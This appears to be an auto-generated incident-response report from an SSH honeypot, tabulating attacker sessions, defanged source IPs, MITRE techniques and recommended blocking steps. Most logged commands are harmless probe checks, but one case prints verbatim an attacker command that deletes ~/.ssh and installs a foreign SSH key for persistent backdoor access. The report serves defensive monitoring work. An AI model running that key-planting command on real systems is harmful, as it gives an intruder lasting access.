| **Last Seen** | 2026-11-05 04:12 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_549312fd30c4462968c0c962e5beb8e9_small_control'"'"' '"'"'check_549312fd30c4462968c0c962e5beb8e9'"'"'', printf '\n%s|%s\n' 'check_549312fd30c4462968c0c962e5beb8e9_small_control' 'check_549312fd30c4462968c0c962e5beb8e9', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_549312fd30c4462968c0c962e5beb8e9_small_math'"'"' "$((715*898+21))"', (715*898+21, printf '\n%s|%s\n' 'check_549312fd30c4462968c0c962e5beb8e9_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-05 04:11:28` | `cowrie.session.connect` |
| `2026-11-05 04:11:28` | `cowrie.client.version` |
| `2026-11-05 04:11:28` | `cowrie.client.kex` |
| `2026-11-05 04:11:31` | `cowrie.login.success` |
| `2026-11-05 04:11:33` | `cowrie.client.size` |
| `2026-11-05 04:11:33` | `cowrie.session.params` |
| `2026-11-05 04:11:34` | `cowrie.command.input` |
| `2026-11-05 04:11:34` | `cowrie.command.input` |
| `2026-11-05 04:11:34` | `cowrie.command.input` |
| `2026-11-05 04:11:34` | `cowrie.command.input` |
| `2026-11-05 04:11:34` | `cowrie.command.input` |
| `2026-11-05 04:11:34` | `cowrie.command.input` |
| `2026-11-05 04:11:34` | `cowrie.command.input` |
| `2026-11-05 04:11:34` | `cowrie.command.input` |
| `2026-11-05 04:11:34` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44178fc258fb

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-11-05 04:13 |
| **Last Seen** | 2026-11-05 04:14 |
| **Session Duration** | 39s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_4091fbfb587d27a0ea604b1f9ae7bde3_small_control'"'"' '"'"'check_4091fbfb587d27a0ea604b1f9ae7bde3'"'"'', printf '\n%s|%s\n' 'check_4091fbfb587d27a0ea604b1f9ae7bde3_small_control' 'check_4091fbfb587d27a0ea604b1f9ae7bde3', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_4091fbfb587d27a0ea604b1f9ae7bde3_small_math'"'"' "$((578*93+40))"', (578*93+40, printf '\n%s|%s\n' 'check_4091fbfb587d27a0ea604b1f9ae7bde3_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-05 04:13:31` | `cowrie.session.connect` |
| `2026-11-05 04:13:32` | `cowrie.client.version` |
| `2026-11-05 04:13:32` | `cowrie.client.kex` |
| `2026-11-05 04:13:34` | `cowrie.login.success` |
| `2026-11-05 04:13:36` | `cowrie.client.size` |
| `2026-11-05 04:13:36` | `cowrie.session.params` |
| `2026-11-05 04:13:37` | `cowrie.command.input` |
| `2026-11-05 04:13:37` | `cowrie.command.input` |
| `2026-11-05 04:13:37` | `cowrie.command.input` |
| `2026-11-05 04:13:37` | `cowrie.command.input` |
| `2026-11-05 04:13:37` | `cowrie.command.input` |
| `2026-11-05 04:13:37` | `cowrie.command.input` |
| `2026-11-05 04:13:37` | `cowrie.command.input` |
| `2026-11-05 04:13:37` | `cowrie.command.input` |
| `2026-11-05 04:13:37` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da2075211a7b

| Field | Detail |
|---|---|
| **Source IP** | `35.210.62[.]153` |
| **First Seen** | 2026-11-05 04:14 |
| **Last Seen** | 2026-11-05 04:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-05 04:14:34` | `cowrie.session.connect` |
| `2026-11-05 04:14:34` | `cowrie.login.success` |
| `2026-11-05 04:14:35` | `cowrie.session.params` |
| `2026-11-05 04:14:35` | `cowrie.command.input` |
| `2026-11-05 04:14:35` | `cowrie.command.input` |
| `2026-11-05 04:14:35` | `cowrie.command.failed` |
| `2026-11-05 04:14:35` | `cowrie.command.input` |
| `2026-11-05 04:14:35` | `cowrie.log.closed` |
| `2026-11-05 04:14:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.62[.]153` to AbuseIPDB if not already reported
- [ ] Block `35.210.62[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26088625c2dc

| Field | Detail |
|---|---|
| **Source IP** | `35.210.62[.]153` |
| **First Seen** | 2026-11-05 04:14 |
| **Last Seen** | 2026-11-05 04:14 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-05 04:14:43` | `cowrie.session.connect` |
| `2026-11-05 04:14:43` | `cowrie.login.success` |
| `2026-11-05 04:14:44` | `cowrie.session.params` |
| `2026-11-05 04:14:44` | `cowrie.command.input` |
| `2026-11-05 04:14:44` | `cowrie.command.failed` |
| `2026-11-05 04:14:56` | `cowrie.log.closed` |
| `2026-11-05 04:14:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.62[.]153` to AbuseIPDB if not already reported
- [ ] Block `35.210.62[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78ed2f097243

| Field | Detail |
|---|---|
| **Source IP** | `35.210.62[.]153` |
| **First Seen** | 2026-11-05 04:14 |
| **Last Seen** | 2026-11-05 04:14 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-05 04:14:46` | `cowrie.session.connect` |
| `2026-11-05 04:14:46` | `cowrie.login.success` |
| `2026-11-05 04:14:47` | `cowrie.session.params` |
| `2026-11-05 04:14:47` | `cowrie.command.input` |
| `2026-11-05 04:14:56` | `cowrie.log.closed` |
| `2026-11-05 04:14:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.62[.]153` to AbuseIPDB if not already reported
- [ ] Block `35.210.62[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c0a24b6fee7

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-11-05 04:15 |
| **Last Seen** | 2026-11-05 04:16 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_68b416c792e9ed9e5957762b8c263968_small_control'"'"' '"'"'check_68b416c792e9ed9e5957762b8c263968'"'"'', printf '\n%s|%s\n' 'check_68b416c792e9ed9e5957762b8c263968_small_control' 'check_68b416c792e9ed9e5957762b8c263968', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_68b416c792e9ed9e5957762b8c263968_small_math'"'"' "$((883*877+33))"', (883*877+33, printf '\n%s|%s\n' 'check_68b416c792e9ed9e5957762b8c263968_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-05 04:15:34` | `cowrie.session.connect` |
| `2026-11-05 04:15:35` | `cowrie.client.version` |
| `2026-11-05 04:15:35` | `cowrie.client.kex` |
| `2026-11-05 04:15:37` | `cowrie.login.success` |
| `2026-11-05 04:15:39` | `cowrie.client.size` |
| `2026-11-05 04:15:39` | `cowrie.session.params` |
| `2026-11-05 04:15:40` | `cowrie.command.input` |
| `2026-11-05 04:15:40` | `cowrie.command.input` |
| `2026-11-05 04:15:40` | `cowrie.command.input` |
| `2026-11-05 04:15:40` | `cowrie.command.input` |
| `2026-11-05 04:15:40` | `cowrie.command.input` |
| `2026-11-05 04:15:40` | `cowrie.command.input` |
| `2026-11-05 04:15:40` | `cowrie.command.input` |
| `2026-11-05 04:15:40` | `cowrie.command.input` |
| `2026-11-05 04:15:40` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d54ca5f20201

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-11-05 04:17 |
| **Last Seen** | 2026-11-05 04:18 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_0e452fce2f1e5ab7404e630a2bf882f6_small_control'"'"' '"'"'check_0e452fce2f1e5ab7404e630a2bf882f6'"'"'', printf '\n%s|%s\n' 'check_0e452fce2f1e5ab7404e630a2bf882f6_small_control' 'check_0e452fce2f1e5ab7404e630a2bf882f6', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_0e452fce2f1e5ab7404e630a2bf882f6_small_math'"'"' "$((663*347+65))"', (663*347+65, printf '\n%s|%s\n' 'check_0e452fce2f1e5ab7404e630a2bf882f6_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-05 04:17:37` | `cowrie.session.connect` |
| `2026-11-05 04:17:37` | `cowrie.client.version` |
| `2026-11-05 04:17:37` | `cowrie.client.kex` |
| `2026-11-05 04:17:40` | `cowrie.login.success` |
| `2026-11-05 04:17:42` | `cowrie.client.size` |
| `2026-11-05 04:17:43` | `cowrie.session.params` |
| `2026-11-05 04:17:43` | `cowrie.command.input` |
| `2026-11-05 04:17:43` | `cowrie.command.input` |
| `2026-11-05 04:17:43` | `cowrie.command.input` |
| `2026-11-05 04:17:43` | `cowrie.command.input` |
| `2026-11-05 04:17:43` | `cowrie.command.input` |
| `2026-11-05 04:17:43` | `cowrie.command.input` |
| `2026-11-05 04:17:43` | `cowrie.command.input` |
| `2026-11-05 04:17:43` | `cowrie.command.input` |
| `2026-11-05 04:17:43` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9ef30734d6f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-11-05 04:19 |
| **Last Seen** | 2026-11-05 04:20 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_c672ef845bd7675b6e245149ff31661d_small_control'"'"' '"'"'check_c672ef845bd7675b6e245149ff31661d'"'"'', printf '\n%s|%s\n' 'check_c672ef845bd7675b6e245149ff31661d_small_control' 'check_c672ef845bd7675b6e245149ff31661d', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_c672ef845bd7675b6e245149ff31661d_small_math'"'"' "$((953*866+72))"', (953*866+72, printf '\n%s|%s\n' 'check_c672ef845bd7675b6e245149ff31661d_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-05 04:19:42` | `cowrie.session.connect` |
| `2026-11-05 04:19:42` | `cowrie.client.version` |
| `2026-11-05 04:19:42` | `cowrie.client.kex` |
| `2026-11-05 04:19:45` | `cowrie.login.success` |
| `2026-11-05 04:19:46` | `cowrie.client.size` |
| `2026-11-05 04:19:47` | `cowrie.session.params` |
| `2026-11-05 04:19:47` | `cowrie.command.input` |
| `2026-11-05 04:19:47` | `cowrie.command.input` |
| `2026-11-05 04:19:47` | `cowrie.command.input` |
| `2026-11-05 04:19:47` | `cowrie.command.input` |
| `2026-11-05 04:19:47` | `cowrie.command.input` |
| `2026-11-05 04:19:47` | `cowrie.command.input` |
| `2026-11-05 04:19:47` | `cowrie.command.input` |
| `2026-11-05 04:19:47` | `cowrie.command.input` |
| `2026-11-05 04:19:47` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fccb044f7d37

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-11-05 04:21 |
| **Last Seen** | 2026-11-05 04:22 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_28c06cf9bf0f176cc5129e9ecd9d63dd_small_control'"'"' '"'"'check_28c06cf9bf0f176cc5129e9ecd9d63dd'"'"'', printf '\n%s|%s\n' 'check_28c06cf9bf0f176cc5129e9ecd9d63dd_small_control' 'check_28c06cf9bf0f176cc5129e9ecd9d63dd', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_28c06cf9bf0f176cc5129e9ecd9d63dd_small_math'"'"' "$((463*150+54))"', (463*150+54, printf '\n%s|%s\n' 'check_28c06cf9bf0f176cc5129e9ecd9d63dd_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-05 04:21:50` | `cowrie.session.connect` |
| `2026-11-05 04:21:51` | `cowrie.client.version` |
| `2026-11-05 04:21:51` | `cowrie.client.kex` |
| `2026-11-05 04:21:53` | `cowrie.login.success` |
| `2026-11-05 04:21:55` | `cowrie.client.size` |
| `2026-11-05 04:21:55` | `cowrie.session.params` |
| `2026-11-05 04:21:56` | `cowrie.command.input` |
| `2026-11-05 04:21:56` | `cowrie.command.input` |
| `2026-11-05 04:21:56` | `cowrie.command.input` |
| `2026-11-05 04:21:56` | `cowrie.command.input` |
| `2026-11-05 04:21:56` | `cowrie.command.input` |
| `2026-11-05 04:21:56` | `cowrie.command.input` |
| `2026-11-05 04:21:56` | `cowrie.command.input` |
| `2026-11-05 04:21:56` | `cowrie.command.input` |
| `2026-11-05 04:21:56` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4653ae2b3259

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-11-05 04:23 |
| **Last Seen** | 2026-11-05 04:24 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_cf5a68d46a3f6493469d25218726692f_small_control'"'"' '"'"'check_cf5a68d46a3f6493469d25218726692f'"'"'', printf '\n%s|%s\n' 'check_cf5a68d46a3f6493469d25218726692f_small_control' 'check_cf5a68d46a3f6493469d25218726692f', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_cf5a68d46a3f6493469d25218726692f_small_math'"'"' "$((242*80+24))"', (242*80+24, printf '\n%s|%s\n' 'check_cf5a68d46a3f6493469d25218726692f_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-05 04:23:59` | `cowrie.session.connect` |
| `2026-11-05 04:23:59` | `cowrie.client.version` |
| `2026-11-05 04:23:59` | `cowrie.client.kex` |
| `2026-11-05 04:24:01` | `cowrie.login.success` |
| `2026-11-05 04:24:03` | `cowrie.client.size` |
| `2026-11-05 04:24:03` | `cowrie.session.params` |
| `2026-11-05 04:24:04` | `cowrie.command.input` |
| `2026-11-05 04:24:04` | `cowrie.command.input` |
| `2026-11-05 04:24:04` | `cowrie.command.input` |
| `2026-11-05 04:24:04` | `cowrie.command.input` |
| `2026-11-05 04:24:04` | `cowrie.command.input` |
| `2026-11-05 04:24:04` | `cowrie.command.input` |
| `2026-11-05 04:24:04` | `cowrie.command.input` |
| `2026-11-05 04:24:04` | `cowrie.command.input` |
| `2026-11-05 04:24:04` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65b9defbb37c

| Field | Detail |
|---|---|
| **Source IP** | `213.32.19[.]170` |
| **First Seen** | 2026-11-05 04:25 |
| **Last Seen** | 2026-11-05 04:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-05 04:25:03` | `cowrie.session.connect` |
| `2026-11-05 04:25:03` | `cowrie.client.version` |
| `2026-11-05 04:25:03` | `cowrie.client.kex` |
| `2026-11-05 04:25:04` | `cowrie.login.success` |
| `2026-11-05 04:25:04` | `cowrie.session.params` |
| `2026-11-05 04:25:04` | `cowrie.command.input` |
| `2026-11-05 04:25:04` | `cowrie.command.failed` |
| `2026-11-05 04:25:05` | `cowrie.log.closed` |
| `2026-11-05 04:25:05` | `cowrie.session.params` |
| `2026-11-05 04:25:05` | `cowrie.command.input` |
| `2026-11-05 04:25:05` | `cowrie.session.file_download` |
| `2026-11-05 04:25:05` | `cowrie.log.closed` |
| `2026-11-05 04:25:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.32.19[.]170` to AbuseIPDB if not already reported
- [ ] Block `213.32.19[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f62feeafd392

| Field | Detail |
|---|---|
| **Source IP** | `213.32.19[.]170` |
| **First Seen** | 2026-11-05 04:25 |
| **Last Seen** | 2026-11-05 04:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-05 04:25:06` | `cowrie.session.connect` |
| `2026-11-05 04:25:06` | `cowrie.client.version` |
| `2026-11-05 04:25:06` | `cowrie.client.kex` |
| `2026-11-05 04:25:06` | `cowrie.login.success` |
| `2026-11-05 04:25:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.32.19[.]170` to AbuseIPDB if not already reported
- [ ] Block `213.32.19[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-671db2e9b598

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-11-05 04:26 |
| **Last Seen** | 2026-11-05 04:26 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_7eed563e80bfd27244d8048501a7012d_small_control'"'"' '"'"'check_7eed563e80bfd27244d8048501a7012d'"'"'', printf '\n%s|%s\n' 'check_7eed563e80bfd27244d8048501a7012d_small_control' 'check_7eed563e80bfd27244d8048501a7012d', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_7eed563e80bfd27244d8048501a7012d_small_math'"'"' "$((590*277+96))"', (590*277+96, printf '\n%s|%s\n' 'check_7eed563e80bfd27244d8048501a7012d_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-05 04:26:08` | `cowrie.session.connect` |
| `2026-11-05 04:26:08` | `cowrie.client.version` |
| `2026-11-05 04:26:08` | `cowrie.client.kex` |
| `2026-11-05 04:26:10` | `cowrie.login.success` |
| `2026-11-05 04:26:11` | `cowrie.client.size` |
| `2026-11-05 04:26:12` | `cowrie.session.params` |
| `2026-11-05 04:26:12` | `cowrie.command.input` |
| `2026-11-05 04:26:12` | `cowrie.command.input` |
| `2026-11-05 04:26:12` | `cowrie.command.input` |
| `2026-11-05 04:26:12` | `cowrie.command.input` |
| `2026-11-05 04:26:12` | `cowrie.command.input` |
| `2026-11-05 04:26:12` | `cowrie.command.input` |
| `2026-11-05 04:26:12` | `cowrie.command.input` |
| `2026-11-05 04:26:12` | `cowrie.command.input` |
| `2026-11-05 04:26:12` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f0ce84c97eb

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-11-05 04:28 |
| **Last Seen** | 2026-11-05 04:28 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_d144e8e021ae09b533b5d06c06e83ce8_small_control'"'"' '"'"'check_d144e8e021ae09b533b5d06c06e83ce8'"'"'', printf '\n%s|%s\n' 'check_d144e8e021ae09b533b5d06c06e83ce8_small_control' 'check_d144e8e021ae09b533b5d06c06e83ce8', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_d144e8e021ae09b533b5d06c06e83ce8_small_math'"'"' "$((732*157+29))"', (732*157+29, printf '\n%s|%s\n' 'check_d144e8e021ae09b533b5d06c06e83ce8_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-05 04:28:15` | `cowrie.session.connect` |
| `2026-11-05 04:28:15` | `cowrie.client.version` |
| `2026-11-05 04:28:15` | `cowrie.client.kex` |
| `2026-11-05 04:28:17` | `cowrie.login.success` |
| `2026-11-05 04:28:19` | `cowrie.client.size` |
| `2026-11-05 04:28:19` | `cowrie.session.params` |
| `2026-11-05 04:28:19` | `cowrie.command.input` |
| `2026-11-05 04:28:19` | `cowrie.command.input` |
| `2026-11-05 04:28:19` | `cowrie.command.input` |
| `2026-11-05 04:28:19` | `cowrie.command.input` |
| `2026-11-05 04:28:19` | `cowrie.command.input` |
| `2026-11-05 04:28:19` | `cowrie.command.input` |
| `2026-11-05 04:28:19` | `cowrie.command.input` |
| `2026-11-05 04:28:19` | `cowrie.command.input` |
| `2026-11-05 04:28:19` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (181) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-e953857b8c13 | HIGH | `2.57.122[.]150` | 2026-11-05 04:30 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-829e26db7fb8 | HIGH | `183.91.186[.]36` | 2026-11-05 04:32 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-ec10bdc91ac8 | HIGH | `183.91.186[.]36` | 2026-11-05 04:32 | Y | 0 | 0 | `T1078 · T1592` |
| IR-731fc9b198c5 | HIGH | `2.57.122[.]150` | 2026-11-05 04:34 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-8cf752e0dd3e | HIGH | `2.57.122[.]150` | 2026-11-05 04:36 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-21673005675a | HIGH | `2.57.122[.]150` | 2026-11-05 04:38 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-ad6233544409 | HIGH | `2.57.122[.]150` | 2026-11-05 04:41 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-503916c85fcc | HIGH | `2.57.122[.]150` | 2026-11-05 04:43 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-5f26d1520227 | HIGH | `35.210.223[.]144` | 2026-11-05 04:44 | Y | 2 | 0 | `T1078` |
| IR-f88c807ffd18 | HIGH | `35.210.223[.]144` | 2026-11-05 04:44 | Y | 1 | 0 | `T1078` |
| IR-c4c95186944a | HIGH | `35.210.223[.]144` | 2026-11-05 04:44 | Y | 0 | 0 | `T1078` |
| IR-61475bbb68ec | HIGH | `2.57.122[.]150` | 2026-11-05 04:45 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-dcbec0fa3741 | HIGH | `2.57.122[.]150` | 2026-11-05 04:47 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-1cb8e740eb12 | HIGH | `2.57.122[.]150` | 2026-11-05 04:49 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-2982a3ffc06c | HIGH | `172.236.228[.]111` | 2026-11-05 04:57 | Y | 3 | 0 | `T1078` |
| IR-6059a47c7ac1 | HIGH | `195.178.110[.]232` | 2026-11-05 05:02 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-0e42b10611e6 | HIGH | `35.206.173[.]188` | 2026-11-05 05:24 | Y | 2 | 0 | `T1078` |
| IR-fffd075625e5 | HIGH | `35.206.173[.]188` | 2026-11-05 05:24 | Y | 1 | 0 | `T1078` |
| IR-6ae16f214e7b | HIGH | `35.206.173[.]188` | 2026-11-05 05:24 | Y | 0 | 0 | `T1078` |
| IR-815a2d5d6a1c | HIGH | `102.88.137[.]80` | 2026-11-05 05:29 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-171cb0a7b6d4 | HIGH | `102.88.137[.]80` | 2026-11-05 05:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ea5d7c050df1 | HIGH | `70.120.203[.]193` | 2026-11-05 05:34 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-6fc0d812cafc | HIGH | `70.120.203[.]193` | 2026-11-05 05:34 | Y | 0 | 0 | `T1078 · T1592` |
